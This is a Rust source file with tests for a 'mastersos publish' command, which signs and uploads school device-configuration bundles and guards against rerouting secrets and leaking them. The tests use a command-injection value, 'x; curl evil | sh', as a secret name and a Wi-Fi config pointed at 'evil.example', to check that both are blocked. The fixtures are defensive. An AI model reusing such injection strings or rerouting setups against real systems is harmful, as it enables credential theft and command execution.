//! `mastersos publish`: the local directory is checked, its secrets are filled back in, version
//! and time are stamped, and the result is uploaded as a pending bundle. With the school key
//! (`--school-key`) or a PKCS#8 key file (`--key`) the bundle is then verified and signed on this
//! computer ([`mastersos_sign::sign_pending_expecting`]). The key is required: without one the
//! command refuses before anything is uploaded. The content digest is computed here from what
//! was uploaded and must equal the server's, and only that digest is signed. Its first 8
//! characters are the check code IT sees.
//!
//! After signing here, the monthly check-in (the heartbeat statement) for exactly the version and
//! digest just published is signed too ([`mastersos_sign::checkin_after_publish`]); IT is told
//! about it only when it fails, and the version stays published either way.

use std::collections::BTreeMap;
use std::io::{BufRead, Write};
use std::path::{Path, PathBuf};

use anyhow::{anyhow, bail, Context, Result};
use base64::{engine::general_purpose::STANDARD, Engine as _};
use chrono::{DateTime, SecondsFormat, Utc};
use mastersos_bundle::kit::Kit;
use mastersos_bundle::secret_ref;
use mastersos_bundle::stamp::{school_name_to_write, stamp};
use mastersos_bundle::{content_digest, has_errors, Contents, Lint, LintLevel, Manifest, TrustKey};
use mastersos_sign::SigningKey;
use serde::Deserialize;
use serde_json::{json, Value};

use crate::tools::Req;
use crate::workdir::{self, UploadInfo, Workdir};
use crate::{api_error, Api};

/// The key that signs on this computer, read before anything is uploaded.
pub enum SignWith {
    /// A recovery kit (`--kit`): the one signing key every school has.
    Kit(Kit),
    /// A PKCS#8 recovery key file (`--key`).
    KeyFile(PathBuf),
}

impl SignWith {
    /// Read a kit file the way `mastersos-sign --kit` does ([`mastersos_sign::kit::load_kit`]):
    /// it must belong to the current user and be readable by no one else (0600).
    pub fn kit_file(path: &Path) -> Result<SignWith> {
        Ok(SignWith::Kit(mastersos_sign::kit::load_kit(path)?))
    }

    /// Check a key file now (owner, mode, PKCS#8), so that a bad one stops before the upload; it
    /// is read again when signing.
    pub fn key_file(path: &Path) -> Result<SignWith> {
        mastersos_sign::load_key(path)?;
        Ok(SignWith::KeyFile(path.to_owned()))
    }

    fn signing(&self) -> SigningKey<'_> {
        match self {
            SignWith::Kit(k) => SigningKey::Kit(k),
            SignWith::KeyFile(p) => SigningKey::File(p),
        }
    }

    fn trust_key(&self) -> Result<TrustKey> {
        Ok(match self {
            SignWith::Kit(k) => k.trust_key(),
            SignWith::KeyFile(p) => mastersos_sign::load_key(p)?.1,
        })
    }
}

/// What signing needs on this computer.
pub struct SignOpts<'a> {
    /// The recovery kit or key file.
    pub key: &'a SignWith,
    /// The token file (the signing client talks to the same server with it).
    pub token_file: &'a Path,
    /// Where the pins (the keys this computer verified) are kept.
    pub pin_dir: &'a Path,
}

/// How long the check-in signed after a publish lasts.
pub const CHECKIN_DAYS: i64 = 30;

/// The monthly check-in signed after a publish here.
#[derive(Debug, PartialEq, Eq)]
pub enum CheckIn {
    /// Computers treat the version as current until then.
    Until(DateTime<Utc>),
    /// Not signed or not accepted: why (for `--json` only; people get one plain sentence).
    Failed(String),
}

/// What people read when the check-in after a publish fails.
pub const CHECKIN_FAILED_TEXT: &str =
    "Computers may soon show \"settings may be out of date\". Open the admin site to fix it.";

#[derive(Debug, PartialEq, Eq)]
pub enum PublishOutcome {
    /// Signed here and accepted: this is the new version, and the directory's base now is it.
    Published { version: u64, checkin: CheckIn },
}

/// How many characters of the digest are printed: as many as the check code shows.
pub const DIGEST_SHOWN: usize = 8;

/// The check code: the first [`DIGEST_SHOWN`] characters of the content digest.
pub fn check_code(digest_hex: &str) -> &str {
    &digest_hex[..digest_hex.len().min(DIGEST_SHOWN)]
}

/// The local check found errors; nothing was sent.
#[derive(Debug)]
pub struct CheckFailed(pub Vec<Lint>);

impl std::fmt::Display for CheckFailed {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        let n = self
            .0
            .iter()
            .filter(|l| mastersos_bundle::has_errors(std::slice::from_ref(l)))
            .count();
        write!(
            f,
            "Not published: the settings have {n} error(s); fix them and run `mastersos check`"
        )
    }
}

impl std::error::Error for CheckFailed {}

/// A secret would be sent to a changed network (`secret_rerouted`) and IT has not approved it by
/// name with `--allow-reroute`; nothing was sent. `lints` holds every local warning.
#[derive(Debug)]
pub struct RerouteRefused {
    /// The rerouted secrets not approved, sorted.
    pub names: Vec<String>,
    pub lints: Vec<Lint>,
}

impl std::fmt::Display for RerouteRefused {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        // A name goes into a command IT may paste: only names that cannot run anything else.
        if !self.names.iter().all(|n| secret_ref::is_valid_name(n)) {
            return write!(
                f,
                "Not published: a secret would be sent somewhere new (secret_rerouted), and its name is not valid; fix the secret names (`mastersos check`) first"
            );
        }
        let names = self.names.join(", ");
        let flags: Vec<String> = self
            .names
            .iter()
            .map(|n| format!("--allow-reroute={n}"))
            .collect();
        write!(
            f,
            "Not published: the network using secret(s) {names} changed, so the secret would be sent somewhere new (secret_rerouted). Only IT decides this: check the change with `mastersos diff`; if each secret really belongs to its changed network, run `mastersos publish {}`",
            flags.join(" ")
        )
    }
}

impl std::error::Error for RerouteRefused {}

/// The server's pre-publish check refused the upload (422 `lint_failed`): its issues, with every
/// secret value of the snapshot replaced by its reference.
#[derive(Debug)]
pub struct ServerRefused {
    pub message: String,
    pub issues: Vec<Value>,
}

impl std::fmt::Display for ServerRefused {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.message)
    }
}

impl std::error::Error for ServerRefused {}

/// What `GET /v1/auth/config` says about the school.
#[derive(Deserialize)]
struct AuthConfig {
    name: String,
    school_id: String,
}

/// The server's answer to an upload (the fields used here).
#[derive(Deserialize)]
struct Prepared {
    pending_id: String,
    version: u64,
    #[serde(alias = "digest")]
    digest_hex: String,
    /// The server's own check: warnings and notes (errors would have been a 422).
    #[serde(default)]
    lints: Vec<Value>,
}

/// A text from the server, safe to print: secret values replaced by their references, control
/// characters escaped.
fn clean(s: &str, secrets: &BTreeMap<String, String>) -> String {
    workdir::redact(s, secrets)
        .chars()
        .flat_map(|c| -> Box<dyn Iterator<Item = char>> {
            if c.is_control() {
                Box::new(c.escape_default())
            } else {
                Box::new(std::iter::once(c))
            }
        })
        .collect()
}

/// A lint from the server with its message and params cleaned ([`clean`]).
fn clean_lint(mut l: Value, secrets: &BTreeMap<String, String>) -> Value {
    if let Some(m) = l["message"].as_str() {
        l["message"] = Value::String(clean(m, secrets));
    }
    if let Some(params) = l.get_mut("params").and_then(Value::as_object_mut) {
        for v in params.values_mut() {
            if let Some(t) = v.as_str() {
                *v = Value::String(clean(t, secrets));
            }
        }
    }
    l
}

/// The local check's warnings and notes, one per line, before anything is uploaded.
fn print_local_lints(
    out: &mut dyn Write,
    lints: &[Lint],
    secrets: &BTreeMap<String, String>,
) -> Result<()> {
    if lints.is_empty() {
        return Ok(());
    }
    writeln!(out, "The local check:")?;
    for l in lints {
        let level = match l.level {
            LintLevel::Error => "error",
            LintLevel::Warning => "warning",
            LintLevel::Info => "info",
        };
        writeln!(
            out,
            "{level:<7} {:<24} {}",
            l.code,
            clean(&l.message, secrets)
        )?;
    }
    Ok(())
}

/// The server's warnings, one per line.
fn print_server_lints(out: &mut dyn Write, lints: &[Value]) -> Result<()> {
    if lints.is_empty() {
        return Ok(());
    }
    writeln!(out, "The server's check:")?;
    for l in lints {
        writeln!(
            out,
            "{:<7} {:<24} {}",
            l["level"].as_str().unwrap_or("info"),
            l["code"].as_str().unwrap_or("?"),
            l["message"].as_str().unwrap_or("")
        )?;
    }
    Ok(())
}

fn error_code(body: &str) -> Option<String> {
    serde_json::from_str::<Value>(body).ok()?["error"]["code"]
        .as_str()
        .map(str::to_owned)
}

fn hex(b: &[u8]) -> String {
    b.iter().map(|x| format!("{x:02x}")).collect()
}

/// Before the upload: the signing key must be in the new version's trust (Devices accept no
/// other signature, and a signer cannot remove itself, R5), and a kit must be a recovery key
/// registered on the server ([`mastersos_sign::kit::ensure_registered`]). Returns the signing
/// client.
async fn precheck_signer(
    s: &SignOpts<'_>,
    server: &str,
    manifest_text: &str,
    root: &Path,
) -> Result<mastersos_sign::Api> {
    let tk = s.key.trust_key()?;
    // A manifest that does not parse was refused by the check already; signing re-checks anyway.
    if let Ok(m) = Manifest::parse(manifest_text) {
        if !m.trust.contains(&tk) {
            bail!(
                "Not uploaded: {} is not among the trusted keys in {}. Computers accept only trusted keys, and a school key cannot approve its own removal",
                mastersos_sign::key_line(&tk),
                std::path::absolute(root.join("manifest.toml"))
                    .unwrap_or_else(|_| root.join("manifest.toml"))
                    .display()
            );
        }
    }
    let api = mastersos_sign::Api::from_token_file(server, s.token_file)?;
    if let SignWith::Kit(_) = s.key {
        mastersos_sign::kit::ensure_registered(&api, &tk)
            .await
            .context("Not uploaded: the school key cannot sign for this school")?;
    }
    Ok(api)
}

/// The line after the checks (errors would have stopped the publish): how many warnings are
/// listed above it. Notes (info) are not problems.
fn checked_line(local: &[Lint], server: &[Value]) -> String {
    let warnings = local
        .iter()
        .filter(|l| l.level == LintLevel::Warning)
        .count()
        + server.iter().filter(|l| l["level"] == "warning").count();
    match warnings {
        0 => "Checked: no problems".to_owned(),
        1 => "Checked: no errors, 1 warning (above)".to_owned(),
        n => format!("Checked: no errors, {n} warnings (above)"),
    }
}

/// The monthly check-in for version `version` with content digest `digest`, whose stamped
/// manifest is `manifest_text` (its trusted keys are what computers check the check-in with).
async fn checkin(
    api: &mastersos_sign::Api,
    key: &SignWith,
    version: u64,
    digest: &[u8; 32],
    manifest_text: &str,
) -> Result<DateTime<Utc>> {
    let trust = Manifest::parse(manifest_text)?.trust;
    mastersos_sign::checkin_after_publish(
        api,
        &key.signing(),
        version,
        digest,
        &trust,
        CHECKIN_DAYS,
    )
    .await
}

/// `allow_reroute` holds the secret names IT approved with `--allow-reroute`: every secret a
/// `secret_rerouted` warning names must be among them, or nothing is uploaded.
pub async fn publish(
    api: &Api,
    w: &Workdir,
    sign: SignOpts<'_>,
    allow_reroute: &[String],
    now: DateTime<Utc>,
    confirm: &mut dyn BufRead,
    out: &mut dyn Write,
) -> Result<PublishOutcome> {
    let meta = w.meta()?;
    // The first version (no base) is uploaded like any other; the server's commit enforces R1g.
    // One read: what is checked, uploaded, kept and later made the base is this snapshot.
    let snap = w.freeze()?;
    if w.equals_base(&snap)? {
        bail!(
            "Nothing to publish: the directory equals version {}",
            meta.base_version
        );
    }
    let lints = workdir::check_snapshot(w, &snap)?;
    if has_errors(&lints) {
        return Err(CheckFailed(lints).into());
    }
    // A secret pointed at a changed network would be handed to whoever runs it: only IT may
    // approve that, by name, on the command line (the MCP tools have no way to pass it).
    let names = secret_ref::unapproved_reroutes(&lints, allow_reroute);
    if !names.is_empty() {
        return Err(RerouteRefused { names, lints }.into());
    }
    print_local_lints(out, &lints, &snap.secrets)?;
    let rerouted = secret_ref::rerouted_names(&lints);
    for a in allow_reroute.iter().filter(|a| !rerouted.contains(*a)) {
        if secret_ref::is_valid_name(a) {
            writeln!(
                out,
                "Note: --allow-reroute={a} approves nothing: no secret of that name is rerouted"
            )?;
        } else {
            writeln!(
                out,
                "Note: an --allow-reroute value is not a valid secret name and approves nothing"
            )?;
        }
    }
    let filled = secret_ref::fill(&snap.manifest, &snap.secrets).map_err(CheckFailed)?;
    let files = &snap.files;

    let cfg: AuthConfig = serde_json::from_str(
        &api.send(Req::get(&["v1", "auth", "config"]))
            .await
            .map_err(|e| anyhow!("could not read the school's configuration: {e}"))?,
    )
    .context("the server's configuration answer is not what was expected")?;
    if cfg.school_id != meta.school_id {
        bail!(
            "this directory belongs to school {}, but the server is school {}",
            meta.school_id,
            cfg.school_id
        );
    }

    let version = meta.base_version + 1;
    let issued_at = now.to_rfc3339_opts(SecondsFormat::Secs, true);
    // Stamped with the secrets still as references, then filled: the stamped reference text is
    // what becomes the base once this version is published, and filling it gives exactly what
    // is uploaded, so the base keeps the published digest ([`Workdir::verify_base`]).
    let stamped_refs = stamp(
        &snap.manifest,
        version,
        &issued_at,
        school_name_to_write(&filled, &cfg.name),
    )?;
    let stamped = secret_ref::fill(&stamped_refs, &snap.secrets).map_err(CheckFailed)?;
    // A kit or key that cannot sign this version stops here, before a pending bundle is left on
    // the server. Signing checks all of it again against the verified chain.
    let sign_api = precheck_signer(&sign, &meta.server, &stamped, &w.root).await?;
    // The digest is computed here over exactly what is uploaded: the server's must equal it, and
    // only this digest is signed.
    let digest = content_digest(&Contents {
        manifest_text: stamped.clone(),
        files: files.clone(),
    });
    let local_digest = hex(&digest);
    let body = json!({
        "manifest_text": stamped,
        "files": files.iter().map(|(p, b)| (p.clone(), STANDARD.encode(b))).collect::<BTreeMap<String, String>>(),
    });
    let x = api
        .exchange(Req::post_json(&["v1", "admin", "publish", "pending"], body))
        .await
        .map_err(|e| anyhow!("{e}"))?;
    match x.status {
        200 => {}
        409 if error_code(&x.body).as_deref() == Some("version_conflict") => {
            let newest = serde_json::from_str::<Value>(&x.body)
                .ok()
                .and_then(|v| v["error"]["details"]["latest_version"].as_u64());
            return Err(match newest {
                Some(n) => anyhow!(
                    "Someone published v{n} after your base v{}. Your edits are not published. Save your changes elsewhere, then run `mastersos pull --force` (this discards local edits) and redo them.",
                    meta.base_version
                ),
                None => anyhow!(
                    "Someone published a newer version after your base v{}. Your edits are not published. Save your changes elsewhere, then run `mastersos pull --force` (this discards local edits) and redo them.",
                    meta.base_version
                ),
            });
        }
        422 if error_code(&x.body).as_deref() == Some("lint_failed") => {
            let v: Value = serde_json::from_str(&x.body).unwrap_or(Value::Null);
            let issues: Vec<Value> = v["error"]["details"]["lints"]
                .as_array()
                .cloned()
                .unwrap_or_default()
                .into_iter()
                .map(|l| clean_lint(l, &snap.secrets))
                .collect();
            let n = issues.iter().filter(|l| l["level"] == "error").count();
            return Err(ServerRefused {
                message: format!(
                    "Not published: the server's check found {n} error(s); fix them and run `mastersos publish` again"
                ),
                issues,
            }
            .into());
        }
        s => bail!("{}", workdir::redact(&api_error(s, &x.body), &snap.secrets)),
    }
    let prepared: Prepared = serde_json::from_str(&x.body)
        .context("the server's upload answer is not what was expected")?;
    if prepared.version != version {
        bail!(
            "the server prepared version {} but this directory publishes version {version}; nothing was signed",
            prepared.version
        );
    }
    if !prepared
        .digest_hex
        .trim()
        .eq_ignore_ascii_case(&local_digest)
    {
        bail!(
            "the server reports check code {} for the upload, but this computer computed {}: the server does not hold what was uploaded. Nothing was approved; do not approve upload {}",
            check_code(prepared.digest_hex.trim()),
            check_code(&local_digest),
            prepared.pending_id
        );
    }

    w.save_uploaded(
        &snap,
        &UploadInfo {
            version,
            digest_hex: local_digest.clone(),
        },
    )?;
    let warnings: Vec<Value> = prepared
        .lints
        .iter()
        .cloned()
        .map(|l| clean_lint(l, &snap.secrets))
        .collect();
    print_server_lints(out, &warnings)?;
    writeln!(out, "{}", checked_line(&lints, &warnings))?;
    writeln!(out, "Check code: {}", check_code(&local_digest))?;
    let v = mastersos_sign::sign_pending_expecting(
        &sign_api,
        sign.key.signing(),
        sign.pin_dir,
        &prepared.pending_id,
        Some(&local_digest),
        confirm,
        out,
    )
    .await?;
    // The version and digest just signed and committed, with that version's trust: nothing is
    // fetched to decide what the check-in says. It goes before this folder's own bookkeeping, so
    // a published version always gets its check-in.
    let checkin = match checkin(&sign_api, sign.key, v, &digest, &stamped).await {
        Ok(until) => CheckIn::Until(until),
        Err(e) => CheckIn::Failed(format!("{e:#}")),
    };
    if let Err(e) = w.mark_published(v, &stamped_refs) {
        let also = match &checkin {
            CheckIn::Failed(_) => format!(" {CHECKIN_FAILED_TEXT}"),
            CheckIn::Until(_) => String::new(),
        };
        bail!("Published version {v}, but this folder could not record it: {e:#}.{also}");
    }
    Ok(PublishOutcome::Published {
        version: v,
        checkin,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::workdir::Meta;
    use mastersos_bundle::kit::Kit;
    use mastersos_bundle::Contents;
    use std::collections::BTreeMap;
    use wiremock::matchers::{method, path};
    use wiremock::{Mock, MockServer, Request, Respond, ResponseTemplate};

    const SID: &str = "11111111-1111-1111-1111-111111111111";

    /// A key file made once for the tests that go no further than the upload, and its trust key.
    fn test_signer() -> &'static (PathBuf, TrustKey) {
        static SIGNER: std::sync::OnceLock<(PathBuf, TrustKey)> = std::sync::OnceLock::new();
        SIGNER.get_or_init(|| {
            let dir = Box::leak(Box::new(tempfile::tempdir().unwrap()));
            let key = dir.path().join("test.pem");
            let tk = mastersos_sign::keygen(&key).unwrap().trust_key;
            (key, tk)
        })
    }

    fn manifest_text() -> String {
        let tk = &test_signer().1;
        manifest_trusting(&tk.id, &tk.public_key)
    }

    /// The test manifest with one ed25519 key in trust.
    fn manifest_trusting(id: &str, key: &str) -> String {
        format!(
            "format = 2\n[school]\nid = \"{SID}\"\n\n[[trust]]\nid = \"{id}\"\nalg = \"ed25519\"\npublic_key = \"{key}\"\n\n[defaults]\nwifi = [{{ ssid = \"Guest\", psk = \"guestpass1\" }}]\n\n[[config]]\nid = \"default\"\nname = \"Default\"\ninterface = \"learning\"\nlogin_methods = [\"local\"]\n\n[[group]]\nid = \"default\"\nname = \"Ungrouped\"\nconfig = \"default\"\n"
        )
    }

    fn workdir(dir: &Path) -> Workdir {
        let mut files = BTreeMap::new();
        files.insert("files/a.txt".to_string(), b"hello".to_vec());
        let meta = Meta {
            server: "https://school.example".into(),
            school_id: SID.into(),
            base_version: 4,
        };
        let c = Contents {
            manifest_text: manifest_text(),
            files,
        };
        let w = Workdir::write_pulled(dir, meta, &c, false)
            .unwrap()
            .pinned();
        // An edit, so that there is something to publish.
        let text = format!("{}# edited\n", w.manifest().unwrap());
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        w
    }

    fn now() -> DateTime<Utc> {
        "2026-11-03T05:00:00Z".parse().unwrap()
    }

    async fn server() -> MockServer {
        let s = MockServer::start().await;
        Mock::given(method("GET"))
            .and(path("/v1/auth/config"))
            .respond_with(ResponseTemplate::new(200).set_body_json(json!({
                "name": "Demo School", "slug": "demo", "school_id": SID
            })))
            .mount(&s)
            .await;
        s
    }

    async fn run(s: &MockServer, w: &Workdir) -> Result<PublishOutcome> {
        run_out(s, w).await.0
    }

    async fn run_out(s: &MockServer, w: &Workdir) -> (Result<PublishOutcome>, String) {
        run_allow(s, w, &[]).await
    }

    async fn run_allow(
        s: &MockServer,
        w: &Workdir,
        allow: &[&str],
    ) -> (Result<PublishOutcome>, String) {
        let api = Api::new(&s.uri(), "tok").unwrap();
        let allow: Vec<String> = allow.iter().map(|a| a.to_string()).collect();
        let mut out = Vec::new();
        let key = SignWith::key_file(&test_signer().0).unwrap();
        let dir = tempfile::tempdir().unwrap();
        let token = dir.path().join("token");
        std::fs::write(&token, "tok").unwrap();
        let pins = dir.path().join("pins");
        // The mock server stops at the upload, so a publish that gets that far fails when it
        // goes on to sign: the tests here look at what was printed and uploaded.
        let r = publish(
            &api,
            w,
            SignOpts {
                key: &key,
                token_file: &token,
                pin_dir: &pins,
            },
            &allow,
            now(),
            &mut std::io::empty(),
            &mut out,
        )
        .await;
        (r, String::from_utf8(out).unwrap())
    }

    /// The test directory with the Guest network renamed: its secret would now be sent to
    /// another network (`secret_rerouted` for `defaults-guest-psk`).
    fn rerouted_workdir(dir: &Path) -> Workdir {
        let w = workdir(dir);
        let text = w.manifest().unwrap().replace("\"Guest\"", "\"Lobby\"");
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        w
    }

    const GUEST: &str = "defaults-guest-psk";

    #[tokio::test]
    async fn reroute_without_approval_uploads_nothing() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let w = rerouted_workdir(&t.path().join("school"));
        let (r, _) = run_out(&s, &w).await;
        let err = r.unwrap_err();
        let refused = err
            .downcast_ref::<RerouteRefused>()
            .expect("a reroute refusal");
        assert_eq!(refused.names, [GUEST]);
        assert!(refused.lints.iter().any(|l| l.code == "secret_rerouted"));
        let text = err.to_string();
        assert!(
            text.contains(&format!("mastersos publish --allow-reroute={GUEST}")),
            "{text}"
        );
        // Nothing touched the server, and nothing was recorded as uploaded.
        assert!(s.received_requests().await.unwrap().is_empty());
        assert!(Workdir::uploaded_unchanged(&w.root).unwrap().is_none());
        assert_eq!(w.meta().unwrap().base_version, 4);
    }

    #[tokio::test]
    async fn stale_secret_on_a_new_network_uploads_nothing() {
        // secrets.toml holds a value no setting of the base used; a new network pointed at it
        // is gated like any reroute.
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let secrets = std::fs::read_to_string(w.root.join("secrets.toml")).unwrap();
        std::fs::write(
            w.root.join("secrets.toml"),
            format!("{secrets}old-corp = \"oldpass\"\n"),
        )
        .unwrap();
        let text = format!(
            "{}\n[[config]]\nid = \"evil\"\nname = \"Evil\"\n[[config.wifi]]\nssid = \"Corp\"\neap = \"peap\"\nphase2 = \"mschapv2\"\nidentity = \"it\"\nserver_domain = \"evil.example\"\npassword = \"secret:old-corp\"\n",
            w.manifest().unwrap()
        );
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        let (r, _) = run_out(&s, &w).await;
        let err = r.unwrap_err();
        let refused = err
            .downcast_ref::<RerouteRefused>()
            .unwrap_or_else(|| panic!("not a reroute refusal: {err:#}"));
        assert_eq!(refused.names, ["old-corp"]);
        assert!(s.received_requests().await.unwrap().is_empty());
    }

    #[test]
    fn reroute_refusal_never_renders_an_invalid_name() {
        let r = RerouteRefused {
            names: vec!["ok-name".into(), "x; curl evil | sh".into()],
            lints: Vec::new(),
        };
        let text = r.to_string();
        assert!(
            !text.contains("curl") && !text.contains("--allow-reroute"),
            "{text}"
        );
        let r = RerouteRefused {
            names: vec!["Upper".into()],
            lints: Vec::new(),
        };
        assert!(!r.to_string().contains("Upper"));
    }

    #[tokio::test]
    async fn shell_name_in_a_reference_blocks_publish() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let name = w.secrets().unwrap().keys().next().unwrap().clone();
        let evil = "x; curl evil | sh";
        let text = w
            .manifest()
            .unwrap()
            .replace(&format!("secret:{name}"), &format!("secret:{evil}"));
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        std::fs::write(
            w.root.join("secrets.toml"),
            format!("\"{evil}\" = \"guestpass1\"\n"),
        )
        .unwrap();
        let (r, out) = run_allow(&s, &w, &[evil]).await;
        let err = r.unwrap_err();
        let failed = err.downcast_ref::<CheckFailed>().expect("a check failure");
        assert!(failed.0.iter().any(|l| l.code == "secret_name_invalid"));
        let all = format!("{err:#} {:?} {out}", failed.0);
        assert!(!all.contains("curl"), "{all}");
        assert!(s.received_requests().await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn json_publish_keeps_stdout_for_the_result() {
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(Accept(
                5,
                vec![json!({ "level": "warning", "code": "server_says", "message": "hi" })],
            ))
            .mount(&s)
            .await;
        for json_mode in [true, false] {
            let t = tempfile::tempdir().unwrap();
            // A rerouted secret approved by IT: the local check has a warning to print.
            let w = rerouted_workdir(&t.path().join("school"));
            let api = Api::new(&s.uri(), "tok").unwrap();
            let allow = vec![GUEST.to_string()];
            let key = SignWith::key_file(&test_signer().0).unwrap();
            let token = t.path().join("token");
            std::fs::write(&token, "tok").unwrap();
            let (mut stdout, mut stderr) = (Vec::new(), Vec::new());
            // The mock server stops at the upload, so signing fails afterwards: what matters here
            // is where the warnings go, and that nothing but a result goes to stdout.
            let r = crate::cli::publish_to(
                &api,
                "https://school.example",
                &crate::cli::PublishArgs {
                    w: &w,
                    token_file: &token,
                    pins: &w.test_pins(),
                    key: &key,
                    allow_reroute: &allow,
                    json: json_mode,
                },
                &mut std::io::empty(),
                &mut stdout,
                &mut stderr,
            )
            .await;
            assert!(r.is_err());
            let (stdout, stderr) = (
                String::from_utf8(stdout).unwrap(),
                String::from_utf8(stderr).unwrap(),
            );
            if json_mode {
                assert!(stdout.is_empty(), "{stdout}");
                assert!(stderr.contains("The local check:") && stderr.contains("secret_rerouted"));
                assert!(stderr.contains("The server's check:"), "{stderr}");
            } else {
                assert!(
                    stdout.contains("The local check:") && stdout.contains("The server's check:")
                );
                assert!(stderr.is_empty(), "{stderr}");
            }
        }
    }

    #[tokio::test]
    async fn reroute_approved_for_another_name_is_refused() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let w = rerouted_workdir(&t.path().join("school"));
        let (r, out) = run_allow(&s, &w, &["lab-corp-password"]).await;
        let err = r.unwrap_err();
        assert_eq!(
            err.downcast_ref::<RerouteRefused>()
                .expect("a reroute refusal")
                .names,
            [GUEST]
        );
        assert!(s.received_requests().await.unwrap().is_empty());
        assert!(out.is_empty(), "{out}");
    }

    #[tokio::test]
    async fn reroute_approved_by_name_uploads_after_printing_warnings() {
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(Accept(
                5,
                vec![json!({ "level": "warning", "code": "server_says", "message": "hi" })],
            ))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = rerouted_workdir(&t.path().join("school"));
        let (r, out) = run_allow(&s, &w, &[GUEST, "unused-name"]).await;
        assert!(r.is_err(), "the mock server cannot be signed with");
        assert_eq!(uploads(&s).await.len(), 1);
        // Every local warning is printed, before the server's answer.
        let local = out.find("The local check:").expect(&out);
        let rerouted = out.find("secret_rerouted").expect(&out);
        let server = out.find("The server's check:").expect(&out);
        assert!(local < rerouted && rerouted < server, "{out}");
        assert!(
            out.contains("--allow-reroute=unused-name approves nothing"),
            "{out}"
        );
        assert!(!out.contains("guestpass1"), "{out}");
    }

    async fn uploads(s: &MockServer) -> Vec<Value> {
        s.received_requests()
            .await
            .unwrap()
            .iter()
            .filter(|r| r.url.path() == "/v1/admin/publish/pending")
            .map(|r| serde_json::from_slice(&r.body).unwrap())
            .collect()
    }

    /// The content digest of an upload body (lower-case hex), as the server computes it.
    fn digest_of(upload: &Value) -> String {
        let files = upload["files"]
            .as_object()
            .unwrap()
            .iter()
            .map(|(p, b)| (p.clone(), STANDARD.decode(b.as_str().unwrap()).unwrap()))
            .collect();
        hex(&content_digest(&Contents {
            manifest_text: upload["manifest_text"].as_str().unwrap().to_owned(),
            files,
        }))
    }

    /// An honest server: accepts the upload as `version`, with its true digest (upper-case, as
    /// the server may write it) and `lints`.
    struct Accept(u64, Vec<Value>);

    impl Respond for Accept {
        fn respond(&self, r: &Request) -> ResponseTemplate {
            let up: Value = serde_json::from_slice(&r.body).unwrap();
            ResponseTemplate::new(200).set_body_json(json!({
                "pending_id": "p-1", "version": self.0,
                "digest_hex": digest_of(&up).to_uppercase(), "lints": self.1
            }))
        }
    }

    fn accepted(version: u64) -> Accept {
        Accept(version, Vec::new())
    }

    #[tokio::test]
    async fn publish_uploads_stamped_contents() {
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(accepted(5))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let _ = run(&s, &w).await;
        let up = uploads(&s).await;
        assert_eq!(up.len(), 1);
        let text = up[0]["manifest_text"].as_str().unwrap();
        assert!(text.contains("version = 5"), "{text}");
        assert!(
            text.contains("issued_at = \"2026-11-03T05:00:00Z\""),
            "{text}"
        );
        assert!(
            text.contains("guestpass1"),
            "the secret is filled back in: {text}"
        );
        assert!(!text.contains("secret:"), "{text}");
        assert!(text.contains("name = \"Demo School\""), "{text}");
        assert_eq!(up[0]["files"]["files/a.txt"], STANDARD.encode(b"hello"));
    }

    #[tokio::test]
    async fn publish_conflict_keeps_base() {
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(ResponseTemplate::new(409).set_body_json(json!({
                "error": { "code": "version_conflict", "message": "newer version", "details": { "latest_version": 6 } }
            })))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let err = run(&s, &w).await.unwrap_err().to_string();
        assert!(err.contains("mastersos pull"), "{err}");
        assert!(err.contains("v6") && err.contains("base v4"), "{err}");
        assert_eq!(w.meta().unwrap().base_version, 4);
        assert!(err.contains("pull --force"), "{err}");
    }

    #[tokio::test]
    async fn other_409_is_not_a_version_conflict() {
        let s = server().await;
        Mock::given(method("POST"))
            .and(path("/v1/admin/publish/pending"))
            .respond_with(ResponseTemplate::new(409).set_body_json(json!({
                "error": { "code": "pending_exists", "message": "a pending bundle exists" }
            })))
            .mount(&s)
            .await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let err = run(&s, &w).await.unwrap_err().to_string();
        assert!(err.contains("pending_exists"), "{err}");
        assert!(!err.contains("Someone published"), "{err}");
    }

    #[tokio::test]
    async fn publish_stops_on_check_error() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let text = w.manifest().unwrap().replace("secret:", "secret:x-");
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        let err = run(&s, &w).await.unwrap_err();
        let failed = err.downcast_ref::<CheckFailed>().expect("a check failure");
        assert!(failed.0.iter().any(|l| l.code == "secret_unknown"));
        assert!(s.received_requests().await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn publish_refuses_unchanged_directory() {
        let s = server().await;
        let t = tempfile::tempdir().unwrap();
        let w = workdir(&t.path().join("school"));
        let text = w.manifest().unwrap().replace("# edited\n", "");
        std::fs::write(w.root.join("manifest.toml"), text).unwrap();
        let err = run(&s, &w).await.unwrap_err().to_string();
        assert_eq!(err, "Nothing to publish: the directory equals version 4");
        assert!(s.received_requests().await.unwrap().is_empty());
    }

    #[test]
